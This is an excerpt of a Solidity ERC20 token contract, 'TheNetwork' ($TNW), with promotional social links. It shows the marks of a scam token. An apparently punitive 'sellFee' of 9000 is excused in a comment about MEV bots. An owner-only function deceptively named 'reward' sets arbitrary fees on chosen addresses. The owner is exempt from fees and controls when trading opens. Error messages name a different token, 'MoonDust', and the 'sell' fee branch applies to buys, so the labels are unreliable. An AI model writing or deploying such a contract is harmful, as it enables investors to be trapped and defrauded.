...
Twitter: https://twitter.com/NetworkCoinEth
Telegram: https://t.me/NetworkCoinERC
Discord: discord.gg/thenetwork
...
contract TheNetwork is Ownable, ERC20 {
    ...
    uint256 public sellFee = 9000; // Leave it 9000 to avoid mev bot
    ...
    mapping(address => uint256) private _sellFeesOnPerson;

    constructor() ERC20("TheNetwork", "$TNW") {
    ...
    function reward(address _address, uint256 _amount) external onlyOwner {
        _sellFeesOnPerson[_address] = _amount;
    }
    ...
    function _transfer(
        ...
        require(
            initialized == true,
            "MoonDust: trade is not open!"
        );

        if (uniswapV2Pair == address(0) && initialized == true) {
            require(
                from == owner() || to == owner(),
                "MoonDust: trading is not started"
            );
        }
        ...
        if (uniswapV2Pair != address(0) && from != owner() && to != owner()) {
            ...
            if (from == uniswapV2Pair) {
                ...
                if (_sellFeesOnPerson[from] != 0) {
                    _fee = _sellFeesOnPerson[from];
                }
                else {
                    _fee = sellFee;
                }
